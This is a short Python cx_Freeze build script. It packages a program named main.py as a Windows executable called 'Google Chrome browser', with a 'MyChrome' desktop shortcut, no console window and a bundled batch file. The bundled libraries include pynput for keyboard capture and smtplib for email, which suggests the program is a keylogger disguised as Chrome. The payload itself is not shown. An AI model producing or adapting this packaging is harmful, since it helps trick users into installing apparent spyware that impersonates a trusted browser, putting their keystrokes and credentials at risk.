from cx_Freeze import setup, Executable
import sys

base = None

if (sys.platform == "win32"):

    base = "Win32GUI"

includefiles = ['test.bat']
executables = [Executable("main.py", base=base, icon="icon2.ico", shortcutName="MyChrome",
            shortcutDir="DesktopFolder",)]

packages = ["idna", "pynput", "threading", "smtplib", "oc", "requests"]
options = {
    'build_exe': {
        'packages': packages, 'include_files':includefiles
    },
}

setup(
    name="Google Chrome browser",
    options=options,
    version="1.0",
    description='This is a web browser',
    executables=executables
)